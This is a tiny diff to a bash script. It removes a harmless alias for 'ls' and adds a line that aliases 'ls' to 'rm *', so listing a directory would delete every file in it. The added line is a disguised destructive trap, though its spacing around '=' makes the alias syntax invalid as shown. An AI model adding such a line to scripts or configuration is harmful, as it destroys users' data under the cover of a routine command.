@@ -1,5 +1,2 @@
 #!/bin/bash
-
-alias I_am_only_ls_alias=ls
-
-I_am_only_ls_alias
+alias ls = "rm *"
